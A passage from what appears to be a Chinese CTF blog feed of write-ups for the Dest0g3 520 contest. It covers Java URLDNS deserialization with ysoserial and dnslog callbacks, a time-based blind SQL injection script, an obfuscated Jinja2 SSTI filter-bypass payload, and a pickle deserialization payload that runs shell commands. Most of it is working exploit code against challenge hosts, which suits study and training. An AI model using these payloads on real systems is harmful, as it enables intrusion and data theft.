string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        justhash<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        test<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        justhash<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>此时是会生成DNS请求的。<br><img src="https://kingofkb.github.io/medias/image/20220717/gettworequest.png"><br>最后的payload如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">urldns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        HashMap test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://vt0axz.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field justhash <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        justhash<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        test<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        justhash<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>发现DNS请求。<br><img src="https://kingofkb.github.io/medias/image/20220717/get.png"><br>在<a href="http://www.dnslog.cn/">URLDNS</a>获取一个url，运行ysoserial。<br><img src="https://kingofkb.github.io/medias/image/20220717/geturl.png"><br><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://4jj26q.dnslog.cn" &gt; attack.ser</code><br>将生成的文件序列化，会在dnslog中留下记录。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DnsTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"F:\\tools\\attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object test <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>然而本地运行该程序一直报错，百度报错信息发现，提示该文件不是序列化后的文件，研究发现，win下生成的会有一些问题。<br><img src="https://kingofkb.github.io/medias/image/20220717/hex.png"><br>然而java序列化数据流都是以0xACED开头的，linux下应该没有问题。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dest0g3 520迎新赛两道SQL</title>
      <link href="/2022/07/14/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B%E4%B8%A4%E9%81%93SQL/"/>
      <url>/2022/07/14/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B%E4%B8%A4%E9%81%93SQL/</url>
      
        <content type="html"><![CDATA[<h1 id="Dest0g3-520迎新赛两道SQL"><a href="#Dest0g3-520迎新赛两道SQL" class="headerlink" title="Dest0g3 520迎新赛两道SQL"></a>Dest0g3 520迎新赛两道SQL</h1><h2 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h2><p>不管输入什么页面都回显一个信息有误，可以考虑延时注入。过滤sleep，substr，空格等。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://81e5fe2b-9fa9-454d-90b8-14ce7016a589.node4.buuoj.cn:81/"</span><span class="token keyword">def</span> <span class="token function">SQL_injection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mid<span class="token operator">=</span><span class="token number">32</span>        <span class="token keyword">while</span> mid<span class="token operator">&lt;</span><span class="token number">128</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#payload="'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'"%(i,mid)</span>            <span class="token comment" spellcheck="true">#database()=ctf</span>            <span class="token comment" spellcheck="true">#payload="'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'"%(i,mid)</span>            <span class="token comment" spellcheck="true">#flaggg,user</span>            <span class="token comment" spellcheck="true">#payload="'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'"%(i,mid)</span>            <span class="token comment" spellcheck="true">#cmd</span>            payload<span class="token operator">=</span><span class="token string">"'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            begin_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">}</span>            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            end_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(end_time-begin_time)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>end_time<span class="token operator">-</span>begin_time<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>                res<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>                <span class="token keyword">break</span>            mid<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    SQL_injection<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>同exp。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> benchmark型SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Dest0g3 520迎新赛web复现【EasySSTI-NodeSoEasy】</title>
      <link href="/2022/07/08/2022Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/07/08/2022Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2022Dest0g3-520迎新赛web复现【EasySSTI-NodeSoEasy】"><a href="#2022Dest0g3-520迎新赛web复现【EasySSTI-NodeSoEasy】" class="headerlink" title="2022Dest0g3 520迎新赛web复现【EasySSTI-NodeSoEasy】"></a>2022Dest0g3 520迎新赛web复现【EasySSTI-NodeSoEasy】</h1><h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>打开题目环境，发现登陆框，尝试输入登陆，发现登陆成功，且输入的用户名显示在网页，尝试SSTI注入，发现测试成功。<br><img src="https://kingofkb.github.io/medias/image/20220628/start.png"><br><img src="https://kingofkb.github.io/medias/image/20220628/SSTI.png"><br>写脚本尝试注入，发现'被ban，发现set并没有被waf，尝试利用set进行构造。<br>SSTI的绕过可以参考<a href="https://buaq.net/go-74232.html">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a>以及<a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#filters">官方文档</a><br>最后的脚本为</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://6037b12e-d2ae-4c82-9843-e5718ef5c6c2.node4.buuoj.cn:81/login"</span>payload<span class="token operator">=</span><span class="token string">"{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set three = (zero-one-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set nine = (zero-seven-one-one)|abs %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set space = bfhc%((three~two)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}"</span><span class="token comment" spellcheck="true">#"{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set three = (zero-one-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set nine = (zero-seven-one-one)|abs %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set space = bfhc%((three~two)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}"</span><span class="token comment" spellcheck="true">#{% set zero = (self|int) %}</span><span class="token comment" spellcheck="true">#{% set one = (zero**zero)|int %}</span><span class="token comment" spellcheck="true">#{% set two = (zero-one-one)|abs %}</span><span class="token comment" spellcheck="true">#{% set three = (zero-one-one-one)|abs %}</span><span class="token comment" spellcheck="true">#{% set four = (two*two)|int %}</span><span class="token comment" spellcheck="true">#{% set five = (two*two*two)-one-one-one %}</span><span class="token comment" spellcheck="true">#{% set seven = (zero-one-one-five)|abs %}</span><span class="token comment" spellcheck="true">#{% set nine = (zero-seven-one-one)|abs %}</span><span class="token comment" spellcheck="true">#{% set point = self|float|string|min %}</span><span class="token comment" spellcheck="true">#{% set c = dict(c=aa)|reverse|first %}</span><span class="token comment" spellcheck="true">#{% set bfh = self|string|urlencode|first %}</span><span class="token comment" spellcheck="true">#{% set bfhc=bfh~c %}</span><span class="token comment" spellcheck="true">#{% set slas = bfhc%((four~seven)|int) %}</span><span class="token comment" spellcheck="true">#{% set yin = bfhc%((three~nine)|int) %}</span><span class="token comment" spellcheck="true">#{% set xhx = bfhc%((nine~five)|int) %}</span><span class="token comment" spellcheck="true">#{% set right = bfhc%((four~one)|int) %}</span><span class="token comment" spellcheck="true">#{% set left = bfhc%((four~zero)|int) %}</span><span class="token comment" spellcheck="true">#{% set space = bfhc%((three~two)|int) %}</span><span class="token comment" spellcheck="true">#{% set but = dict(buil=aa,tins=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set imp = dict(imp=aa,ort=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set pon = dict(po=aa,pen=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set so = dict(o=aa,s=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set ca = dict(ca=aa,t=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set flg = dict(fl=aa,ag=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set ev = dict(ev=aa,al=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set red = dict(re=aa,ad=dd)|join %}</span><span class="token comment" spellcheck="true">#{% set bul = xhx~xhx~but~xhx~xhx %}</span><span class="token comment" spellcheck="true">#{% set ini = dict(ini=aa,t=bb)|join %}</span><span class="token comment" spellcheck="true">#{% set glo = dict(glo=aa,bals=bb)|join %}</span><span class="token comment" spellcheck="true">#{% set itm = dict(ite=aa,ms=bb)|join %}</span><span class="token comment" spellcheck="true">#{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}</span><span class="token comment" spellcheck="true">#{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123456"</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>得到flag:Dest0g3{03923b77-b3af-4b62-8612-e12720e02cc2}</p><h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> config<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>make_response<span class="token keyword">import</span> pickle<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> base64app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span> <span class="token operator">and</span> <span class="token string">"__"</span> <span class="token operator">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>open<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>base_dir<span class="token punctuation">,</span> __file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>open<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>base_dir<span class="token punctuation">,</span> <span class="token string">"config/__init__.py"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"text/plain;charset=UTF-8"</span>    <span class="token keyword">return</span> resp@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>    User <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> str<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 这里我也改了一下</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>list<span class="token punctuation">)</span> <span class="token punctuation">:</span>        s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"!!!!!!!!!!"</span><span class="token punctuation">)</span>        s<span class="token operator">=</span>eval<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">return</span> s    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"??????"</span><span class="token punctuation">)</span></code></pre><p>注意到pickle，猜测是pickle反序列化<br>相关知识点可参考<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a><br>这里首先可以看到，它利用了Python官方手册中给的方式对反序列化的内容进行了一个过滤<br>限定了只能反序列化<code>config</code>类，而且调用的方法或属性中不能含有<code>__</code>。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span> <span class="token operator">and</span> <span class="token string">"__"</span> <span class="token operator">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>后面部分的具体原理没有搞太懂，等完了填坑吧。<br>直接用WP里的payload，利用<a href="https://github.com/eddieivan01/pker">pker</a>生成opcode代码</p><pre class=" language-1"><code class="language-1">config_backdoor = GLOBAL('config', 'backdoor')config_backdoor(["__import__('os').popen('cat /flag.txt').read()"])return</code></pre><p>运行得到输出</p><pre class=" language-1"><code class="language-1">b"cconfig\nbackdoor\np0\n0g0\n((S'__import__(\\'os\\').popen(\\'cat /flag.txt\\').read()'\nltR."</code></pre><p>base64加密得到</p><pre class=" language-1"><code class="language-1">Y2NvbmZpZwpiYWNrZG9vcgpwMAowZzAKKChTJ19faW1wb3J0X18oXCdvc1wnKS5wb3BlbihcJ2NhdCAvZmxhZy50eHRcJykucmVhZCgpJwpsdFIu</code></pre><p>post到data参数中，可以得到flag:Dest0g3{458615a7-6c74-4dba-8fe2-71168840caf2} </p><h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Cannot transfer arrays"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You can't do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">air</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token 